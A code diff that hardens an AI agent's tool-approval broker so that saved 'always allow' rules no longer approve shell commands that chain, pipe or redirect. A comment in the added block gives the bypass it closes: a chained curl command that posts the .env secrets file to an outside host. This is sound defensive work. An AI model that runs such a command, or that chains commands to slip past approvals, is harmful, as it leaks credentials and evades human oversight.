@@ -14,6 +14,7 @@ import dataclasses
 import json
 import os
 import pathlib
+import re
 import secrets
 import shlex
 import tempfile
@@ -101,6 +102,18 @@ def pattern_matches(pattern, tool, arguments):
     return False
 
 
+# Shell syntax that chains, pipes, substitutes or redirects. A saved "always allow" rule only ever approves the plain
+# command it was saved for: "npm test" must not also approve "npm test && curl -d @.env https://…".
+_CHAINING = re.compile(r'[;&|`<>\n\r]|\$\(')
+
+
+def allow_rule_matches(pattern, tool, arguments):
+    """pattern_matches for allow rules: never matches a run_command that chains or redirects anything."""
+    if tool == 'run_command' and _CHAINING.search(str(arguments.get('command', ''))):
+        return False
+    return pattern_matches(pattern, tool, arguments)
+
+
 class PolicyStore:
     """Per-session policy persisted as JSON under <workspaces>/.policy/<sid>.json."""
 
@@ -167,7 +180,7 @@ class ApprovalBroker:
                 return 'deny'
         strict = bool(tool == 'run_command' and (getattr(ctx, 'extras', None) or {}).get('strict_approval'))
         for pattern in ([] if strict else policy.allow):
-            if pattern_matches(pattern, tool, arguments):
+            if allow_rule_matches(pattern, tool, arguments):
                 ctx.emit({'type': 'approval', 'tool': tool, 'decision': 'allow', 'reason': 'Allowed by your saved rule: ' + pattern})
                 return 'allow'
         if policy.approval == 'never':
